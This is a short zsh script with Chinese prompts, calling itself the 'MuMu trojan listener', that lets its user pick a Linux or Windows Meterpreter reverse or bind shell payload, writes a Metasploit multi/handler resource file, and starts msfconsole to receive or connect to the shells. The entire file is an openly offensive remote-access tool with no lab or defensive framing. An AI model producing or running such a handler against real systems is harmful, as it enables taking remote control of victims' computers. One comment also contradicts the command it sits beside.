#!/bin/zsh

echo "====== ������ MuMu 木马监听器 ======"
echo "1. Linux - Reverse Shell (默认)"
echo "2. Linux - Bind Shell"
echo "3. Windows - Reverse Shell"
echo "4. Windows - Bind Shell"

echo -n "选择模块编号 [1-4, 默认1]: "
read module

case $module in
    2)
        payload="linux/x64/meterpreter/bind_tcp"
        echo -n "请输入目标地址（必须）: "
        read lhost
        if [[ -z "$lhost" ]]; then
            echo "❌ 地址不能为空！"
            exit 1
        fi
        echo -n "请输入监听端口 [默认4444]: "
        read port
        port=${port:-4444}
        ;;
    3)
        payload="windows/meterpreter/reverse_tcp"
        lhost="0.0.0.0"
        echo -n "请输入监听端口 [默认4444]: "
        read port
        port=${port:-4444}
        ;;
    4)
        payload="windows/meterpreter/bind_tcp"
        echo -n "请输入目标地址（必须）: "
        read lhost
        if [[ -z "$lhost" ]]; then
            echo "❌ 地址不能为空！"
            exit 1
        fi
        echo -n "请输入监听端口 [默认4444]: "
        read port
        port=${port:-4444}
        ;;
    *)
        payload="linux/x64/meterpreter/reverse_tcp"
        lhost="0.0.0.0"
        echo -n "请输入监听端口 [默认4444]: "
        read port
        port=${port:-4444}
        ;;
esac

# 生成 rc 文件
rc_file="listener.rc"
echo "use exploit/multi/handler" > $rc_file
echo "set PAYLOAD $payload" >> $rc_file
echo "set LPORT $port" >> $rc_file

if [[ "$payload" == *"bind"* ]]; then
    echo "set RHOST $lhost" >> $rc_file
else
    echo "set LHOST $lhost" >> $rc_file
fi

echo "options" >> $rc_file
echo "jobs" >> $rc_file
echo "run -j" >> $rc_file  # 改为前台运行更稳定

echo "✅ 监听配置已生成：$rc_file"
echo "������ 启动监听器..."
msfconsole -r $rc_file

rm -f "$rc_file"
echo "������ 临时 rc 文件已清理：$rc_file"

